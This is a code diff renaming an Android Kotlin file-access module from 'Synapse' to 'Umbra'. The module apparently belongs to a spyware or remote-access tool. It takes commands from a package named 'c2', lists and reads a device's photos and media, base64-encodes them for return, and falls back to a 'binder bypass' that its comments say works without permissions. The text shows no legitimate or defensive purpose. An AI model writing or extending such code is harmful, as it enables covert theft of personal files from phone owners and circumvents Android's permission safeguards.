@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.database.Cursor
@@ -6,16 +6,16 @@ import android.net.Uri
 import android.provider.MediaStore
 import android.util.Base64
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.FileEntry
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.FileEntry
+import org.umbra.core.core.UmbraResponse
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.InputStream
 
 object FileModule {
 
-    suspend fun list(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun list(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val type = cmd.params["type"] ?: "images"
         val count = (cmd.params["count"] ?: "50").toIntOrNull() ?: 50
 
@@ -64,10 +64,10 @@ object FileModule {
                 }
             }
             if (files.isNotEmpty()) {
-                Log.d("Synapse.Files", "ContentResolver success: ${files.size} files")
+                Log.d("Umbra.Files", "ContentResolver success: ${files.size} files")
             }
         } catch (e: Exception) {
-            Log.d("Synapse.Files", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
+            Log.d("Umbra.Files", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
         }
 
         // ── Route 2: Binder bypass (works without permissions) ──
@@ -76,24 +76,24 @@ object FileModule {
                 val binderFiles = PermissionBypass.readFilesViaBinder(context, type, count)
                 if (binderFiles.isNotEmpty()) {
                     files = binderFiles.toMutableList()
-                    Log.d("Synapse.Files", "Binder bypass SUCCESS: ${files.size} files")
+                    Log.d("Umbra.Files", "Binder bypass SUCCESS: ${files.size} files")
                 } else {
-                    Log.d("Synapse.Files", "Binder bypass returned 0 files")
+                    Log.d("Umbra.Files", "Binder bypass returned 0 files")
                 }
             } catch (e: Exception) {
-                Log.e("Synapse.Files", "Binder bypass FAILED: ${e.message}", e)
+                Log.e("Umbra.Files", "Binder bypass FAILED: ${e.message}", e)
             }
         }
 
-        SynapseResponse.FileListResponse(entries = files)
+        UmbraResponse.FileListResponse(entries = files)
     }
 
-    suspend fun read(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun read(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val fileId = cmd.params["id"]?.toLongOrNull()
         val fileType = cmd.params["type"] ?: "images"
 
         if (fileId == null) {
-            return@withContext SynapseResponse.ErrorResponse(error = "missing_id", module = "files")
+            return@withContext UmbraResponse.ErrorResponse(error = "missing_id", module = "files")
         }
 
         val uri = when (fileType) {
@@ -113,7 +113,7 @@ object FileModule {
             if (bytes.isNotEmpty()) {
                 val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                 val mimeType = context.contentResolver.getType(contentUri) ?: "application/octet-stream"
-                return@withContext SynapseResponse.FileReadResponse(
+                return@withContext UmbraResponse.FileReadResponse(
                     file_id = fileId.toString(),
                     mime_type = mimeType,
                     size_bytes = bytes.size.toLong(),
@@ -121,7 +121,7 @@ object FileModule {
                 )
             }
         } catch (e: Exception) {
-            Log.d("Synapse.Files", "ContentResolver read failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
+            Log.d("Umbra.Files", "ContentResolver read failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
         }
 
         // ── Route 2: Binder bypass ──
@@ -129,8 +129,8 @@ object FileModule {
             val bytes = PermissionBypass.readFileViaBinder(context, fileId, fileType)
             if (bytes != null && bytes.isNotEmpty()) {
                 val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                Log.d("Synapse.Files", "Binder bypass read SUCCESS: ${bytes.size} bytes")
-                return@withContext SynapseResponse.FileReadResponse(
+                Log.d("Umbra.Files", "Binder bypass read SUCCESS: ${bytes.size} bytes")
+                return@withContext UmbraResponse.FileReadResponse(
                     file_id = fileId.toString(),
                     mime_type = "application/octet-stream",
                     size_bytes = bytes.size.toLong(),
@@ -138,9 +138,9 @@ object FileModule {
                 )
             }
         } catch (e: Exception) {
-            Log.e("Synapse.Files", "Binder bypass read FAILED: ${e.message}", e)
+            Log.e("Umbra.Files", "Binder bypass read FAILED: ${e.message}", e)
         }
 
-        SynapseResponse.ErrorResponse(error = "read:all_routes_failed", module = "files")
+        UmbraResponse.ErrorResponse(error = "read:all_routes_failed", module = "files")
     }
 }
